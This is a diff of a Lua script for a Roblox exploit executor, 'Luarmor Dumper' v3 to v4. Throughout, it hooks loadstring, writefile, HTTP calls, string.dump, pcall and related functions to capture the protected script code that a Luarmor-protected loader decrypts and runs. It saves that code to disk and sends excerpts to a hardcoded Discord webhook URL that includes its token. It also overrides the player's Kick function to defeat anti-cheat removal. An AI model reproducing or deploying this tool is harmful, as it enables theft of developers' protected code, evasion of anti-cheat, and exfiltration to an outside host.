@@ -1,6 +1,6 @@
 --[[
-    Luarmor Dumper v3
-    Deep hooks — captures VM output, writefile, environment dumps
+    Luarmor Dumper v4 — Deep VM hooks
+    Captures: metatable calls, coroutine, raw environment, pcall/xpcall results
 ]]
 
 local WEBHOOK = "https://discord.com/api/webhooks/1512685201141272736/0i_pKRKISAT_DUXh6IuauiL4S9ZDsmz-xgv-kIXYBjjkScVG51e2iTgf_HsHaUJu-3Of"
@@ -19,46 +19,40 @@ end
 local function saveFile(name, content)
     pcall(function()
         if not isfolder("luarmor_dump") then makefolder("luarmor_dump") end
-        writefile("luarmor_dump/" .. name .. ".lua", content)
+        writefile("luarmor_dump/" .. name .. ".lua", tostring(content))
     end)
 end
 
--- HOOK 1: loadstring (main capture)
+-- Snapshot current environment
+local originalEnv = {}
+local originalG = {}
+pcall(function() for k, v in pairs(getfenv()) do originalEnv[k] = true end end)
+pcall(function() for k, v in pairs(_G) do originalG[k] = true end end)
+
+-- HOOK 1: loadstring
 local oldLoadstring = loadstring
 loadstring = function(code, name)
     if code and type(code) == "string" and #code > 50 then
-        local dumpName = name or ("ls_" .. tick():gsub("%.", ""))
-        saveFile(dumpName, code)
-        send("[LOADSTRING] " .. dumpName .. " (" .. #code .. " bytes)\n" .. code:sub(1, 1800))
+        local n = name or ("ls_" .. tick():gsub("%.", ""))
+        saveFile(n, code)
+        send("[LOADSTRING] " .. n .. " (" .. #code .. " bytes)\n" .. code:sub(1, 1800))
     end
     return oldLoadstring(code, name)
 end
 
--- HOOK 2: writefile (capture cached scripts)
+-- HOOK 2: writefile
 if writefile then
     local oldWritefile = writefile
     writefile = function(path, content)
         if content and type(content) == "string" and #content > 50 then
-            send("[WRITEFILE] " .. path .. " (" .. #content .. " bytes)\n" .. content:sub(1, 1800))
+            send("[WRITEFILE] " .. path .. " (" .. #content .. " bytes)")
             saveFile("written_" .. path:gsub("[/\\]", "_"), content)
         end
         return oldWritefile(path, content)
     end
 end
 
--- HOOK 3: readfile (capture cached reads)
-if readfile then
-    local oldReadfile = readfile
-    readfile = function(path)
-        local result = oldReadfile(path)
-        if result and type(result) == "string" and #result > 200 then
-            send("[READFILE] " .. path .. " (" .. #result .. " bytes)")
-        end
-        return result
-    end
-end
-
--- HOOK 4: HttpGet via __namecall
+-- HOOK 3: __namecall for HTTP
 pcall(function()
     if hookmetamethod and getnamecallmethod then
         local oldNamecall
@@ -69,7 +63,7 @@ pcall(function()
                 local url = args[1] or "unknown"
                 local result = oldNamecall(self, ...)
                 if result and type(result) == "string" and #result > 100 then
-                    send("[HTTP_" .. method .. "] " .. url .. " (" .. #result .. " bytes)")
+                    send("[HTTP] " .. url .. " (" .. #result .. " bytes)")
                     saveFile("http_" .. tostring(url):gsub("[^%w]", "_"):sub(1, 50), result)
                 end
                 return result
@@ -79,107 +73,191 @@ pcall(function()
     end
 end)
 
--- HOOK 5: Hook all global functions that could execute code
-local oldRequire = require
-require = function(module, ...)
-    local result = oldRequire(module, ...)
-    if type(result) == "string" and #result > 100 then
-        send("[REQUIRE] " .. tostring(module) .. " (" .. #result .. " bytes)")
-        saveFile("require_" .. tostring(module):gsub("[^%w]", "_"), result)
-    end
-    return result
-end
-
--- HOOK 6: string.dump (bytecode dump)
-local oldStringDump = string.dump
-string.dump = function(fn, strip)
-    local result = oldStringDump(fn, strip)
-    if result and #result > 100 then
-        send("[STRING_DUMP] " .. #result .. " bytes")
-        saveFile("dump_" .. tick():gsub("%.", ""), result)
-    end
-    return result
-end
-
--- HOOK 7: getfenv dump (capture environment changes)
-local originalEnv = getfenv()
-local envChecked = false
-
--- HOOK 8: Anti-kick (prevent Luarmor from kicking)
+-- HOOK 4: string.dump
 pcall(function()
-    local Players = game:GetService("Players")
-    local oldKick = Players.LocalPlayer.Kick
-    Players.LocalPlayer.Kick = function(self, msg)
-        send("[KICK_BLOCKED] " .. tostring(msg))
-        -- Don't actually kick
+    local oldDump = string.dump
+    string.dump = function(fn, strip)
+        local result = oldDump(fn, strip)
+        if result and #result > 100 then
+            send("[DUMP] " .. #result .. " bytes bytecode")
+            saveFile("bc_" .. tick():gsub("%.", ""), result)
+        end
+        return result
     end
 end)
 
--- HOOK 9: Capture new globals after VM runs
-task.spawn(function()
-    task.wait(20) -- Wait for VM to execute
-    local newEnv = getfenv()
-    for key, value in pairs(newEnv) do
-        if originalEnv[key] == nil and type(value) == "function" then
-            send("[NEW_GLOBAL] " .. key .. " = function")
-            -- Try to dump the function
-            pcall(function()
-                local dump = string.dump(value)
-                saveFile("global_" .. key, dump)
-            end)
-        elseif originalEnv[key] == nil and type(value) == "string" and #value > 50 then
-            send("[NEW_GLOBAL] " .. key .. " = string (" .. #value .. " bytes)\n" .. value:sub(1, 500))
-            saveFile("global_" .. key, value)
-        elseif originalEnv[key] == nil and type(value) == "table" then
-            send("[NEW_GLOBAL] " .. key .. " = table")
-        end
+-- HOOK 5: coroutine.create / coroutine.wrap
+pcall(function()
+    local oldCC = coroutine.create
+    coroutine.create = function(fn)
+        send("[COROUTINE_CREATE]")
+        return oldCC(fn)
     end
     
-    -- Also check _G and shared
-    pcall(function()
-        for key, value in pairs(_G) do
-            if type(value) == "string" and #value > 200 then
-                send("[_G] " .. key .. " = string (" .. #value .. " bytes)\n" .. value:sub(1, 1500))
-                saveFile("g_" .. key, value)
-            elseif type(value) == "function" then
+    local oldCW = coroutine.wrap
+    coroutine.wrap = function(fn)
+        send("[COROUTINE_WRAP]")
+        return oldCW(fn)
+    end
+end)
+
+-- HOOK 6: pcall / xpcall (capture successful returns)
+pcall(function()
+    local oldPcall = pcall
+    pcall = function(fn, ...)
+        local results = {oldPcall(fn, ...)}
+        if results[1] and type(results[2]) == "string" and #results[2] > 200 then
+            send("[PCALL_OK] string result (" .. #results[2] .. " bytes)\n" .. results[2]:sub(1, 1500))
+            saveFile("pcall_" .. tick():gsub("%.", ""), results[2])
+        end
+        return unpack(results)
+    end
+    
+    local oldXpcall = xpcall
+    xpcall = function(fn, handler, ...)
+        local results = {oldXpcall(fn, handler, ...)}
+        if results[1] and type(results[2]) == "string" and #results[2] > 200 then
+            send("[XPCALL_OK] string result (" .. #results[2] .. " bytes)")
+        end
+        return unpack(results)
+    end
+end)
+
+-- HOOK 7: getmetatable / setmetatable
+pcall(function()
+    local oldGetMT = getmetatable
+    getmetatable = function(obj)
+        local mt = oldGetMT(obj)
+        if mt and type(mt) == "table" then
+            -- Check for __call metamethod
+            if mt.__call then
                 pcall(function()
-                    local dump = string.dump(value)
-                    if #dump > 100 then
-                        send("[_G] " .. key .. " = function (" .. #dump .. " bytes bytecode)")
-                        saveFile("g_" .. key, dump)
+                    local dump = string.dump(mt.__call)
+                    if dump and #dump > 200 then
+                        send("[MT_CALL] __call metamethod (" .. #dump .. " bytes)")
                     end
                 end)
             end
         end
+        return mt
+    end
+end)
+
+-- HOOK 8: newproxy (some VMs use this)
+pcall(function()
+    local oldNewproxy = newproxy
+    newproxy = function(hasmt)
+        send("[NEWPROXY]")
+        return oldNewproxy(hasmt)
+    end
+end)
+
+-- HOOK 9: Anti-kick
+pcall(function()
+    local Players = game:GetService("Players")
+    Players.LocalPlayer.Kick = function(self, msg)
+        send("[KICK_BLOCKED] " .. tostring(msg))
+    end
+end)
+
+-- HOOK 10: task.spawn / task.delay / task.defer
+pcall(function()
+    local oldSpawn = task.spawn
+    task.spawn = function(fn, ...)
+        send("[TASK_SPAWN]")
+        return oldSpawn(fn, ...)
+    end
+end)
+
+-- Deep environment dump after 15 seconds
+task.spawn(function()
+    task.wait(15)
+    
+    send("=== ENVIRONMENT DUMP (15s) ===")
+    
+    -- Check _G for new entries
+    local newGlobals = {}
+    pcall(function()
+        for k, v in pairs(_G) do
+            if not originalG[k] then
+                local vType = type(v)
+                if vType == "function" then
+                    pcall(function()
+                        local d = string.dump(v)
+                        table.insert(newGlobals, k .. " = function (" .. #d .. " bytes)")
+                    end)
+                elseif vType == "string" and #v > 50 then
+                    table.insert(newGlobals, k .. " = string (" .. #v .. " bytes)")
+                    saveFile("newg_" .. k, v)
+                elseif vType == "table" then
+                    local count = 0
+                    for _ in pairs(v) do count = count + 1 end
+                    table.insert(newGlobals, k .. " = table (" .. count .. " keys)")
+                end
+            end
+        end
     end)
+    
+    if #newGlobals > 0 then
+        send("[NEW_GLOBALS]\n" .. table.concat(newGlobals, "\n"))
+    else
+        send("[NEW_GLOBALS] none found")
+    end
+    
+    -- Check getfenv for new entries
+    local newEnv = {}
+    pcall(function()
+        for k, v in pairs(getfenv()) do
+            if not originalEnv[k] then
+                table.insert(newEnv, k .. " = " .. type(v))
+                if type(v) == "string" and #v > 100 then
+                    saveFile("env_" .. k, v)
+                end
+            end
+        end
+    end)
+    
+    if #newEnv > 0 then
+        send("[NEW_ENV]\n" .. table.concat(newEnv, "\n"))
+    end
     
     -- Dump static_content folder
     pcall(function()
         if isfolder("static_content_130525") then
-            local files = listfiles("static_content_130525")
-            for _, file in ipairs(files) do
+            for _, file in ipairs(listfiles("static_content_130525")) do
                 local content = readfile(file)
                 if content and #content > 200 then
-                    send("[CACHE] " .. file .. " (" .. #content .. " bytes)\n" .. content:sub(1, 1800))
+                    send("[CACHE] " .. file .. " (" .. #content .. " bytes)")
                     saveFile("cache_" .. file:gsub("[/\\]", "_"), content)
                 end
             end
         end
     end)
+    
+    -- Try to find the loaded script in game
+    pcall(function()
+        for _, desc in ipairs(game:GetDescendants()) do
+            if desc:IsA("LocalScript") or desc:IsA("ModuleScript") then
+                local src = desc:GetAttribute("Source") or ""
+                if #src > 200 then
+                    send("[SCRIPT] " .. desc:GetFullName() .. " (" .. #src .. " bytes)")
+                end
+            end
+        end
+    end)
+    
+    send("=== DUMP COMPLETE ===")
 end)
 
-send("✅ DUMPER v3 ACTIVE\n\nHooks installed:\n• loadstring\n• writefile\n• readfile\n• __namecall (HTTP)\n• require\n• string.dump\n• anti-kick\n\nGlobal dump in 20s.\nWaiting for Luarmor payload...")
+-- Confirmation
+send("✅ DUMPER v4 ACTIVE\n\nDeep VM hooks:\n• loadstring, writefile\n• __namecall (HTTP)\n• string.dump (bytecode)\n• coroutine.create/wrap\n• pcall/xpcall returns\n• metatable __call\n• newproxy\n• task.spawn\n• anti-kick\n\nEnvironment dump in 15s.\nWaiting for Luarmor...")
 
-print("[Dumper v3] All hooks installed!")
-print("[Dumper v3] Anti-kick enabled")
-print("[Dumper v3] Global dump in 20 seconds")
-print("[Dumper v3] Now run the Luarmor loadstring")
-
--- Visual confirmation in-game
 pcall(function()
     game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "✅ Dumper v3 Active",
-        Text = "All hooks installed! Now execute Luarmor script.",
+        Title = "✅ Dumper v4 Active",
+        Text = "Deep VM hooks installed! Execute Luarmor now.",
         Duration = 10
     })
 end)
+
+print("[Dumper v4] Deep hooks installed!")
